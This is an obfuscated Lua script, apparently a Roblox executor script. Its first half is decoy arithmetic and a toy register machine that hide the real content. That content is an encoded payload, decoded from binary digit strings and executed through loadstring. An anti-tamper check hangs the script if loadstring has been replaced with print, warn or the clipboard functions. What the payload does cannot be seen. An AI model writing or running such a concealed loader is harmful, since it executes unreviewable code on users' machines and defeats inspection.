local function a(b) return b + 2 end local function c(d) return d * 2 end local function e(f, g) return f - g end local function h(i, j) return i / j end local function k(l) return l ^ 2 end local function m(n) return n % 3 end local p = 5 local q = a(p) local r = c(q) local s = e(r, p) local t = h(s, p) local u = k(t) local v = m(u) local x = 10 local y = a(x) local z = e(y, 4) local w = c(z) local j1 = h(w, 3) local k1 = m(j1) local function l1() return p * q end local function l2() return e(r, s) end local function l3() return t + u end local function l4() return v - w end local z1 = l1() local z2 = l2() local z3 = l3() local z4 = l4() local t1 = a(z1) local t2 = c(z2) local t3 = e(z3, z4) local t4 = h(t1, t2) local t5 = m(t3) local function n1(x) return x * 4 end local function n2(y) return y + 5 end local function n3(z) return z - 10 end local result1 = n1(t5) local result2 = n2(result1) local result3 = n3(result2) local temp = result3 + 100 local final = temp / 10 local vm = {} vm.registers = {A = 0, B = 0, C = 0, D = 0} vm.memory = {} vm.stack = {} vm.pc = 1 vm.code = {} local function op_add(r1, r2) return r1 + r2 end local function op_sub(r1, r2) return r1 - r2 end local function op_mul(r1, r2) return r1 * r2 end local function op_div(r1, r2) if r2 == 0 then return 0 else return r1 / r2 end end local function dummy1(a, b) local c = a + b local d = a * b local e = c - d local f = h(c, b + 1) return f + d end local function dummy2(x) local y = x * 2 local z = x - y return z + a(x) end local instr_set = {} instr_set["ADD"] = function(reg, val) vm.registers[reg] = vm.registers[reg] + val end instr_set["SUB"] = function(reg, val) vm.registers[reg] = vm.registers[reg] - val end instr_set["MUL"] = function(reg, val) vm.registers[reg] = vm.registers[reg] * val end instr_set["DIV"] = function(reg, val) vm.registers[reg] = vm.registers[reg] / val end local program = { {"ADD", "A", 5}, {"MUL", "B", 3}, {"SUB", "C", 2}, {"DIV", "D", 4}, {"ADD", "A", 7}, {"MUL", "C", 2}, {"SUB", "B", 1}, {"DIV", "A", 2}, {"ADD", "D", 10}, {"SUB", "C", 3}, {"MUL", "B", 4}, {"DIV", "D", 2} } local function load_program(prog) for i = 1, #prog do vm.code[i] = prog[i] end end local function execute_program() for i = 1, #vm.code do local inst = vm.code[i] local op = inst[1] local reg = inst[2] local val = inst[3] if instr_set[op] then instr_set[op](reg, val) end end end local function vm_initialization() vm.registers.A = final vm.registers.B = p + x vm.registers.C = z1 vm.registers.D = t4 for i = 1, 50 do vm.stack[i] = (i * 3) % 7 end for i = 1, 100 do vm.memory[i] = i % 5 end end local function vm_loop() local count = 0 while count < 100 do vm.pc = vm.pc + 1 vm.registers.A = op_add(vm.registers.A, dummy1(count, vm.pc)) vm.registers.B = op_sub(vm.registers.B, dummy2(count)) vm.registers.C = op_mul(vm.registers.C, 1.001) vm.registers.D = op_div(vm.registers.D, 1.002) count = count + 1 end end local function auxiliary() local arr = {} for i = 1, 30 do arr[i] = i * a(i) - c(i) end local sum = 0 for i = 1, #arr do sum = sum + arr[i] end local prod = 1 for i = 1, #arr do prod = op_mul(prod, (arr[i] % 5 + 1)) end local mix = dummy1(sum, prod) for i = 1, 20 do mix = op_add(mix, dummy2(i)) end vm.registers.A = vm.registers.A + mix end vm_initialization() load_program(program) execute_program() vm_loop() auxiliary() local q_nz_x_z = {e_xp_n_x = {__xp__l_ = table.concat},ex_qfIx_ = {l__xep_f = loadstring},epqIqqI_ = {_e_f_fn_ = tonumber},_nll_l__ = {Ifl__v__ = string.char},_x____z_ = { e__v_q_z = setmetatable}, Izz_nzfv = { qlf__f__ = nil} } local ___z_fz_ = q_nz_x_z.e_xp_n_x.__xp__l_ local pn______ = q_nz_x_z.ex_qfIx_.l__xep_f local _x___z__ = q_nz_x_z.epqIqqI_._e_f_fn_ local _xee__n_ = q_nz_x_z._nll_l__.Ifl__v__ local _____x_p = q_nz_x_z._x____z_.e__v_q_z local z_l_____ = q_nz_x_z.Izz_nzfv.qlf__f__ local n__n_xv_ = _xee__n_(108, 111, 97, 100, 115, 116, 114, 105, 110, 103) function fp_fx___(pln_nI_v) local luacrypt_so_tuff = "ts pmo icl dnt pmo wrd2foenem" local __pp____ = pln_nI_v local q_ee__v_ = setclipboard local __z_enIp = toclipboard local function ___q_I_x(n___x_x_) return function() return n___x_x_ end end local ze___Ive = warn local function _zq__I__(e_xvx_f_) return ___q_I_x(e_xvx_f_)() end local _z_npzxp = error local function nxl__qex() while true do end end local __n_f_f_ = print local function p_x_p_II() return _zq__I__(math.random(100, 999)) end local _xlf_npn = game local lqvzvee_ = {pn______,_xlf_npn,__n_f_f_,ze___Ive,_z_npzxp,q_ee__v_,__z_enIp} if lqvzvee_[1] == lqvzvee_[3] or lqvzvee_[1] == lqvzvee_[4] or lqvzvee_[1] == lqvzvee_[5] or lqvzvee_[1] == lqvzvee_[6] or lqvzvee_[1] == lqvzvee_[7] then nxl__qex() end local function n_____xn(qx__nIx_) local function __I_pep_(lIx__px_) return _xee__n_(_x___z__(lIx__px_, 2)) end p_x_p_II() local x___I_q_ = qx__nIx_:gsub("[^01]", "") return x___I_q_:gsub("(".. ("[01]"):rep(8) .. ")", __I_pep_) end local ______x_ = n_____xn(__pp____) local sporty = game:GetService("Workspace") local function zzI__Ix_(v_lpv__v) local x_qz_lzz, x__qn___, __f___nn, __p___I_ = "l", "o", "a", "d" local __qq__f_, _zz__q_x, l_xq_ex_, f_zlp___ = "s", "t", "r", "i" local _v____vx, e____p__ = "n", "g" local function _IxIenzv(...) local x_qpl__l, x______v = {...}, "" for i = 1, #x_qpl__l do x______v = x______v .. x_qpl__l[i] end return x______v end local plp____x = _IxIenzv(x_qz_lzz, x__qn___, __f___nn, __p___I_, __qq__f_, _zz__q_x, l_xq_ex_, f_zlp___, _v____vx, e____p__) local _v______ = ("%s"):format(plp____x) local __I___zq, _l_pxxpq = pcall(pn______(v_lpv__v)) local q_ef_zx_, _q_xelpp, _qp__z_p = "WZF____D_S__RW____S__F__Z__DWQFW___WV___G___ZW_FZZ", "__X_FV_Z__FWFWDF_DV___WS_ZD__X_ZV_RX_W_F_D__WFFQ__", "_GZ_WS___F_R_F_WQ____R__X_Z____WF_______QFD_____W_" local _xffx_x_ = (2 * 5 / 10 + 3 - 3) ^ 1 if not __I___zq then local pp_elnf_ = { q_ef_zx_, _q_xelpp, _qp__z_p, _xffx_x_ } for i = 1, # pp_elnf_ do pp_elnf_[i] = pp_elnf_[i] .. "_extra" end end return _l_pxxpq end zzI__Ix_(______x_, q_nz_x_z.Izz_nzfv.qlf__f__); p_x_p_II() local e__znlll = _____x_p( { xz___x__ = { I__zfl__ = { __ne__p_, ___fp___, z_z_f_q_ }, __x_xp__ = function() for _q_____l = 1, 50 do local qn_nvf__ = _q_____l * 2 local _qvqxn__ = {_q_____l, _q_____l * 10, _q_____l * 100} end return q_nz_x_z.Izz_nzfv.qlf__f__ end }, l_____p_ = { [true] = { function() for _vn_____ = 1, 100 do local ezene__l = _vn_____ * _vn_____ if ezene__l > 100 then break end end end }, [false] = { { function() return false end }, function() for __np_xf_ = 1, 10 do local n___Iq__ = __np_xf_ * 2 end end } } }, { __index = function(_, l_xllz__) local _pexIev_ = "Lua Crypt1" if l_xllz__ == "print" then for xv_q__l_ = 1, 100 do local _q___f__ = xv_q__l_ * xv_q__l_ + xv_q__l_ end return print elseif l_xllz__ == "warn" then for l____e__ = 1, 50 do local q___pfv_ = l____e__ * 3 if q___pfv_ == 150 then return warn end end end return q_nz_x_z.Izz_nzfv.qlf__f__ end } ) end fp_fx___(___z_fz_({'033549136737122345039673123563176729046954033335','029239162666135594095756124732147376156232129376','059355144692196696097642065749063477049256146567','065672175436157323079942053556137354065995026259','096467136239194435125435035355096464162364173244','057393133663129955176923024466196326023643035373','066595152394124636153736022674023344173763099296','094347152727145595066979144693077552075464142936','037425163797136279023233174697127962126647062345','062423162642149249023722027773195362126346135645','023543035433124249059657143572092425079926037344','066334125967144933043435072694143475197753175645','035339177227173496049269039523053379025792199264','052644177335163792034539174246146422046293125375','059749132545194296045377062742122599033496195592','035264067242192962143754193636076929124624067623','046599173296037557043757196366066265075435069777','063959164466125777152495067753152322037295057367','042267147557124766149434037653139637074337072756','097626192742199724155692074737064474093239053629','052795136926039357037727069754156263136935144334','037424159679127495063792039375137724042992153693','029374146436134964149652093737123249095356053692','099373042624166555057645196744069729099775023426','099576056255143529027279092355035455149975023335','099943137667166752022556125725022445047425059625','055592164746142625169522094724169324034534047966','034524162697196564134464076734147565073429099995','079622165495152637149535097769056322096964056436','065327164993194349125946026734049339136997175466','029932045963174597154274145262036493127552059935','092392092976167422027654157443166994122776149566','077922064569122537076256129354139346175475163333','075423179657179996137745032445036626053796033276','072725164792195537045395072497093652092337167395','095697127633133697177245092444073476145577197457','034552163765194637195754045335129465059924066497','032764192666154999074977063929166633095439193535','095455136395142952077256044469055959167734054976','075969143699157294099535175237045759037566156964','076973196576156766024469139693129232124379062695','043322035546133657053792137579133777125573022796','095552134973127796079244077445072365124623146975','079464152466152225044273125359139633175995155934','067943143677196354042599122752172469097934162962','073765056555145559059497194654162956167723153935','062667132525147673179566096534035593153734075294','093537125433153276097349057466036949066475124526','094922137742172555156432034563195696194657176964','032935096972156225093339192334123936195799156999','073662165265043296165367054232137226037966133939','045534126463179722067564157235032669164667172565','026743177679077493032755047434059445054933136257','049636165365124327044595064937053447142423142649','039533056373132623165599047327057433165432032737','045376195357074675034796194473097537145424067343','046376134654156646123476097449174942035399152934','045922059773144769157253025637073999067994169237','063333072477127355063526092577055432173592079264','053595025735144296033542199635026767077342147627','022994096256162259054965157356095576075925145726','095774022999163767063539124643072527049759094463','079596075765169729044337179755079723039634147544'}))
